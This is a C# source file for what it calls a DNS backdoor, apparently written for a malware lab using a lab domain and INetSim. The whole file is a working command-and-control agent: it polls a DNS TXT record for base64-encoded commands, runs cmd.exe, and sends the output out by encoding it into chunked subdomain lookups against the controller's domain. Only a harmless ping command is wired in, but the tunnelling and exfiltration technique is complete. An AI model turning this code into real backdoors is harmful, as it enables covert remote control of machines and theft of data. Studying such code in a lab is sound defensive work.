using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace A06_6_DNS_Backdoor
{
    class Program
    {
        private static readonly string RootDomain = "cmd.lab.local";
        private static bool _isRunning = true;

        private const ushort DNS_TYPE_TEXT = 0x0010;
        private const uint DNS_QUERY_STANDARD = 0x00000000;

        // RESTORED STRUCT: Custom structure definition matching native Windows text mappings
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_TXT_DATA
        {
            public uint dwStringCount;
            public IntPtr pStringArray;
        }

        // RESTORED STRUCT: Core structure description template parsed by Marshal.OffsetOf
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct DNS_RECORD
        {
            public IntPtr pNext;
            public string pName;
            public ushort wType;
            public ushort wDataLength;
            public uint flags;
            public uint dwTtl;
            public uint dwReserved;
            public DNS_TXT_DATA Data;
        }

        [DllImport("dnsapi.dll", CharSet = CharSet.Unicode, EntryPoint = "DnsQuery_W")]
        private static extern int DnsQuery(
            string pszName,
            ushort wType,
            uint Options,
            IntPtr pExtra,
            out IntPtr ppQueryResultsSet,
            IntPtr pReserved
        );

        [DllImport("dnsapi.dll")]
        private static extern void DnsRecordListFree(IntPtr pRecordList, int FreeType);

        private static string _lastCommand = string.Empty;

        static void Main(string[] args)
        {
            Console.WriteLine("[*] Starting DNS Polling Agent Diagnostic Session...");
            Console.WriteLine($"[*] Target Root Domain Configuration: {RootDomain}");
            Console.WriteLine("[*] Press Ctrl+C to terminate early.\n");

            while (_isRunning)
            {
                try
                {
                    string queryTarget = $"agent77.{RootDomain}";
                    Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] Querying INetSim via TXT lookup for: {queryTarget}...");

                    string? rawPayload = FetchNativeTxtRecord(queryTarget);

                    if (string.IsNullOrEmpty(rawPayload))
                    {
                        Console.WriteLine("[-] Received NULL or empty raw network payload from DNS server.");
                    }
                    else
                    {
                        Console.WriteLine($"[+] Raw Network Payload Retrieved successfully: \"{rawPayload}\"");

                        string commandLine = DecodeBase64(rawPayload).ToLower().Trim();
                        Console.WriteLine($"[+] Decoded Command Value: \"{commandLine}\"");

                        if (commandLine == _lastCommand)
                        {
                            Console.WriteLine($"[*] Command \"{commandLine}\" matches previously handled token. Skipping execution loop to avoid spam.");
                        }
                        else
                        {
                            Console.WriteLine($"[*] Processing updated instruction token: \"{commandLine}\"");
                            _lastCommand = commandLine;

                            switch (commandLine)
                            {
                                case "ping":
                                    Console.WriteLine("[*] Entering case 'ping' execution block...");
                                    ExecuteAndExfiltratePing();
                                    break;

                                case "exit":
                                    Console.WriteLine("[!] 'exit' token processed. Terminating active execution service loop.");
                                    _isRunning = false;
                                    break;

                                default:
                                    Console.WriteLine($"[-] Unknown command value received: \"{commandLine}\". No processing block available.");
                                    break;
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"\n[CRITICAL] Top-level Exception caught in Main Loop:\n{ex.ToString()}\n");
                }

                Console.WriteLine($"[*] Main iteration complete. Sleeping for 30 seconds...\n");
                Thread.Sleep(30000);
            }
        }

        private static void ExecuteAndExfiltratePing()
        {
            try
            {
                Console.WriteLine("[*] Initializing System.Diagnostics.Process for cmd.exe...");
                using (System.Diagnostics.Process proc = new System.Diagnostics.Process())
                {
                    proc.StartInfo.FileName = "cmd.exe";
                    proc.StartInfo.Arguments = "/c ping 127.0.0.1 -n 2";
                    proc.StartInfo.RedirectStandardOutput = true;
                    proc.StartInfo.UseShellExecute = false;
                    proc.StartInfo.CreateNoWindow = true;

                    Console.WriteLine("[*] Invoking proc.Start()...");
                    proc.Start();

                    Console.WriteLine("[*] Reading StandardOutput stream content...");
                    string output = proc.StandardOutput.ReadToEnd();
                    Console.WriteLine($"[+] Stream read complete. Bytes read: {output.Length}");

                    Console.WriteLine("[*] Invoking proc.WaitForExit(5000)...");
                    bool exitedCleanly = proc.WaitForExit(5000);
                    Console.WriteLine($"[*] Process exited cleanly within timeout boundary: {exitedCleanly}");

                    if (string.IsNullOrEmpty(output))
                    {
                        Console.WriteLine("[-] Command standard output stream was empty. Skipping data transmission step.");
                        return;
                    }

                    Console.WriteLine("[*] Converting string output data stream to Base64 byte array elements...");
                    byte[] textBytes = Encoding.UTF8.GetBytes(output);
                    string base64Output = Convert.ToBase64String(textBytes).Replace("=", "");
                    Console.WriteLine($"[+] Normalized Base64 data block generated: {base64Output.Length} characters total.");

                    int chunkSize = 30;
                    Console.WriteLine($"[*] Commencing chunk exfiltration routine over Type A records (Chunk Size: {chunkSize})...");

                    for (int i = 0; i < base64Output.Length; i += chunkSize)
                    {
                        string chunk = (i + chunkSize >= base64Output.Length)
                            ? base64Output.Substring(i)
                            : base64Output.Substring(i, chunkSize);

                        int indexPosition = i / chunkSize;
                        string exfilDomain = $"data.{indexPosition}.{chunk}.{RootDomain}";
                        Console.WriteLine($"    -> [{indexPosition}] Transmitting Frame Domain: \"{exfilDomain}\"");

                        IntPtr pDummy = IntPtr.Zero;
                        int status = DnsQuery(exfilDomain, 0x0001, DNS_QUERY_STANDARD, IntPtr.Zero, out pDummy, IntPtr.Zero);

                        if (pDummy != IntPtr.Zero)
                        {
                            DnsRecordListFree(pDummy, 0);
                        }

                        Thread.Sleep(500);
                    }
                    Console.WriteLine("[+] Exfiltration process step concluded completely.");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception caught in ExecuteAndExfiltratePing block: {ex.Message}");
            }
        }

        private static string? FetchNativeTxtRecord(string domain)
        {
            IntPtr pResultList = IntPtr.Zero;

            try
            {
                int status = DnsQuery(domain, DNS_TYPE_TEXT, DNS_QUERY_STANDARD, IntPtr.Zero, out pResultList, IntPtr.Zero);

                if (status == 0 && pResultList != IntPtr.Zero)
                {
                    ushort recordType = (ushort)Marshal.ReadInt16(pResultList, 16);

                    if (recordType == DNS_TYPE_TEXT)
                    {
                        // Calculate the dynamic structure offsets cleanly to preserve 64-bit stability
                        int dataOffset = (int)Marshal.OffsetOf<DNS_RECORD>("Data");
                        IntPtr pStringArrayBase = IntPtr.Add(pResultList, dataOffset + 8);

                        if (pStringArrayBase != IntPtr.Zero)
                        {
                            IntPtr pActualStringBytes = Marshal.ReadIntPtr(pStringArrayBase);

                            if (pActualStringBytes != IntPtr.Zero)
                            {
                                string? txtResult = Marshal.PtrToStringUni(pActualStringBytes);
                                DnsRecordListFree(pResultList, 0);
                                return txtResult;
                            }
                        }
                    }
                    DnsRecordListFree(pResultList, 0);
                }
                else
                {
                    Console.WriteLine($"[-] DnsQuery API returned non-zero status. Win32 Status Code: {status}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Exception during memory translation: {ex.Message}");
                if (pResultList != IntPtr.Zero) DnsRecordListFree(pResultList, 0);
            }
            return null;
        }

        private static string DecodeBase64(string base64Data)
        {
            try
            {
                byte[] data = Convert.FromBase64String(base64Data);
                return Encoding.UTF8.GetString(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Base64 Decoding failed for text block: {ex.Message}");
                return string.Empty;
            }
        }
    }
}